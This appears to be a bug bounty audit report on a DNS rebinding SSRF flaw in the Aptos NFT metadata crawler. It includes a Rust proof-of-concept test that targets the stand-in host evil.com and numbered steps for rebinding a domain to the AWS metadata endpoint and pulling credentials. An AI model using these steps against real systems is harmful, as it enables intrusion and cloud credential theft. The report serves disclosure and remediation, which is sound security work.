# Audit Report

## Title
DNS Rebinding Attack Enabling SSRF in NFT Metadata Crawler

## Summary
The NFT metadata crawler's `get_uri_metadata()` function is vulnerable to DNS rebinding attacks due to multiple independent DNS resolutions for the same URI without IP address validation. An attacker controlling a malicious domain can cause the first DNS lookup to resolve to a safe public IP, pass initial validation, then have subsequent DNS lookups resolve to internal IP addresses (127.0.0.1, 169.254.169.254, private networks), enabling Server-Side Request Forgery (SSRF) attacks against internal services and cloud metadata endpoints.

## Finding Description

The vulnerability exists in a Time-of-Check-Time-of-Use (TOCTOU) race condition between multiple HTTP requests: [1](#0-0) 

The `get_uri_metadata()` function creates a new HTTP client and performs a HEAD request. However, this function is called as a preliminary check before subsequent GET requests that use separate HTTP clients: [2](#0-1) [3](#0-2) 

**Attack Flow:**

1. Attacker creates an NFT with a metadata URI pointing to their controlled domain (e.g., `evil.com`)
2. Attacker configures DNS with TTL=0 to prevent caching
3. When `get_uri_metadata()` makes the HEAD request (first DNS resolution), the domain resolves to a safe public IP (e.g., 1.2.3.4)
4. Validation passes based on response headers
5. When the subsequent GET request creates a new `Client` and sends the request (second DNS resolution), the attacker's DNS server responds with an internal IP (127.0.0.1, 169.254.169.254, 192.168.x.x, 10.x.x.x)
6. The GET request is sent to the internal IP, bypassing any URI-based blacklist checks

The system only implements string-based URI blacklisting with no IP address validation: [4](#0-3) [5](#0-4) 

Each `reqwest::Client` creation triggers independent DNS resolution with no DNS caching or IP validation between requests.

## Impact Explanation

This vulnerability qualifies as **Medium Severity** under Aptos Bug Bounty criteria:

**SSRF Attack Vectors:**
- **Cloud Metadata Endpoints**: Access to AWS (169.254.169.254), GCP, or Azure metadata services could expose cloud credentials, IAM roles, and access tokens
- **Internal Services**: Access to localhost services (127.0.0.1) including databases, admin panels, or internal APIs
- **Network Scanning**: Port scanning of internal infrastructure (10.x.x.x, 192.168.x.x, 172.16-31.x.x ranges)
- **Service Discovery**: Enumeration of internal service endpoints and their responses

**Security Impact:**
- Credential theft from cloud metadata services
- Information disclosure about internal infrastructure
- Potential lateral movement if credentials are obtained
- Bypassing network segmentation intended to protect internal services

While this vulnerability is in an off-chain indexing service rather than core consensus/execution layers, infrastructure compromise can lead to cascading failures and unauthorized access to sensitive systems.

## Likelihood Explanation

**Likelihood: Medium to High**

**Attacker Requirements:**
- Control over a DNS domain (low cost, ~$10/year)
- Ability to create or influence NFT metadata URIs processed by the crawler
- DNS server capable of returning different responses (trivial setup)

**Feasibility:**
- The attack requires no special privileges or insider access
- DNS rebinding is a well-established attack technique with existing tooling
- NFT metadata URIs are user-supplied and processed automatically
- The TOCTOU window exists in normal operation flow
- No detection mechanisms are in place

**Exploitation Complexity:**
- Low - Standard DNS rebinding tools exist
- Attack can be automated
- Success rate is high due to lack of validation

## Recommendation

Implement IP address validation before making HTTP requests to external URIs:

```rust
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

fn is_private_ip(ip: &IpAddr) -> bool {
    match ip {
        IpAddr::V4(ipv4) => {
            ipv4.is_private() 
            || ipv4.is_loopback() 
            || ipv4.is_link_local()
            || ipv4.octets()[0] == 169 && ipv4.octets()[1] == 254  // Cloud metadata
        },
        IpAddr::V6(ipv6) => {
            ipv6.is_loopback() 
            || (ipv6.segments()[0] & 0xfe00) == 0xfc00  // Unique local
            || ipv6.segments()[0] == 0xfe80  // Link local
        }
    }
}

pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    // Parse URL and resolve to IP before making request
    let parsed_url = Url::parse(url.trim())?;
    let host = parsed_url.host_str()
        .ok_or_else(|| anyhow::anyhow!("Invalid host"))?;
    
    // Resolve DNS and validate IP
    let addrs: Vec<_> = tokio::net::lookup_host((host, 80))
        .await?
        .map(|addr| addr.ip())
        .collect();
    
    for ip in &addrs {
        if is_private_ip(ip) {
            return Err(anyhow::anyhow!("Blocked: private IP address"));
        }
    }
    
    // Reuse validated connection with DNS pinning
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .resolve(host, addrs[0].to_string().parse().unwrap())
        .build()?;
        
    // ... rest of function
}
```

**Additional Recommendations:**
1. Use connection pooling with DNS pinning for the same URI
2. Implement allowlist of known-safe domains/IP ranges
3. Add monitoring for repeated DNS resolution patterns
4. Consider using a forward proxy with IP filtering

## Proof of Concept

```rust
// PoC demonstrating DNS rebinding vulnerability
// This test would require a controlled DNS server

#[tokio::test]
async fn test_dns_rebinding_ssrf() {
    // Setup: Attacker controls evil.com DNS
    // Initially evil.com -> 1.2.3.4 (safe IP)
    // After first request: evil.com -> 127.0.0.1 (internal IP)
    
    let malicious_uri = "http://evil.com/metadata.json";
    
    // First call - DNS resolves to safe IP
    let (mime, size) = get_uri_metadata(malicious_uri).await.unwrap();
    println!("First HEAD request succeeded: {} bytes", size);
    
    // Attacker changes DNS between requests (TTL=0)
    // evil.com now resolves to 127.0.0.1
    
    // Second call - new Client, new DNS resolution to 127.0.0.1
    let client = Client::builder()
        .timeout(Duration::from_secs(30))
        .build()
        .unwrap();
    
    let response = client.get(malicious_uri).send().await.unwrap();
    let body = response.text().await.unwrap();
    
    // Attacker now receives response from localhost:80
    // Could be internal admin panel, API, or service
    println!("Second GET request hit: {}", body);
    
    // Expected: Access to internal service at 127.0.0.1
    // Actual: No IP validation prevents this attack
}
```

**Real-world exploitation steps:**
1. Register domain `nft-metadata-attack.com`
2. Configure authoritative DNS server with TTL=0
3. Create NFT with metadata URI: `http://nft-metadata-attack.com/metadata.json`
4. Initial DNS query returns public IP (passes any domain blacklist)
5. HEAD request succeeds to public IP
6. Modify DNS to return `169.254.169.254` (AWS metadata)
7. GET request fetches from cloud metadata endpoint
8. Extract credentials from response stored in database/GCS

**Notes:**

While the NFT metadata crawler is an off-chain ecosystem service, SSRF vulnerabilities in infrastructure components can lead to:
- Cloud account compromise via metadata endpoint access
- Credential theft enabling further attacks
- Internal network reconnaissance
- Foundation for privilege escalation attacks

The vulnerability is real, exploitable, and requires immediate remediation despite not directly affecting blockchain consensus.

### Citations

**File:** ecosystem/nft-metadata-crawler/src/lib.rs (L17-38)
```rust
pub async fn get_uri_metadata(url: &str) -> anyhow::Result<(String, u32)> {
    let client = Client::builder()
        .timeout(Duration::from_secs(MAX_HEAD_REQUEST_RETRY_SECONDS))
        .build()
        .context("Failed to build reqwest client")?;
    let request = client.head(url.trim());
    let response = request.send().await?;
    let headers = response.headers();

    let mime_type = headers
        .get(header::CONTENT_TYPE)
        .map(|value| value.to_str().unwrap_or("text/plain"))
        .unwrap_or("text/plain")
        .to_string();
    let size = headers
        .get(header::CONTENT_LENGTH)
        .and_then(|value| value.to_str().ok())
        .and_then(|s| s.parse::<u32>().ok())
        .unwrap_or(0);

    Ok((mime_type, size))
}
```

**File:** ecosystem/nft-metadata-crawler/src/utils/json_parser.rs (L31-64)
```rust
        PARSE_JSON_INVOCATION_COUNT.inc();
        let (mime, size) = get_uri_metadata(&uri).await?;
        if ImageFormat::from_mime_type(&mime).is_some() {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["found image instead"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received image file: {}, skipping",
                mime
            )));
        } else if size > max_file_size_bytes {
            FAILED_TO_PARSE_JSON_COUNT
                .with_label_values(&["json file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "JSON parser received file too large: {} bytes, skipping",
                size
            )));
        }

        let op = || {
            async {
                info!(asset_uri = uri, "Sending request for asset_uri");

                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_JSON_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get JSON")?;
```

**File:** ecosystem/nft-metadata-crawler/src/utils/image_optimizer.rs (L40-65)
```rust
        OPTIMIZE_IMAGE_INVOCATION_COUNT.inc();
        let (_, size) = get_uri_metadata(uri).await?;
        if size > max_file_size_bytes {
            FAILED_TO_OPTIMIZE_IMAGE_COUNT
                .with_label_values(&["Image file too large"])
                .inc();
            return Err(anyhow::anyhow!(format!(
                "Image optimizer received file too large: {} bytes, skipping",
                size
            )));
        }

        let op = || {
            async {
                info!(image_uri = uri, "Sending request for image");

                let client = Client::builder()
                    .timeout(Duration::from_secs(MAX_IMAGE_REQUEST_RETRY_SECONDS))
                    .build()
                    .context("Failed to build reqwest client")?;

                let response = client
                    .get(uri.trim())
                    .send()
                    .await
                    .context("Failed to get image")?;
```

**File:** ecosystem/nft-metadata-crawler/src/parser/worker.rs (L386-391)
```rust
    fn is_blacklisted_uri(&mut self, uri: &str) -> bool {
        self.parser_config
            .uri_blacklist
            .iter()
            .any(|blacklist_uri| uri.contains(blacklist_uri))
    }
```

**File:** ecosystem/nft-metadata-crawler/src/parser/config.rs (L26-30)
```rust
    #[serde(default)]
    pub ack_parsed_uris: bool,
    #[serde(default)]
    pub uri_blacklist: Vec<String>,
}
```
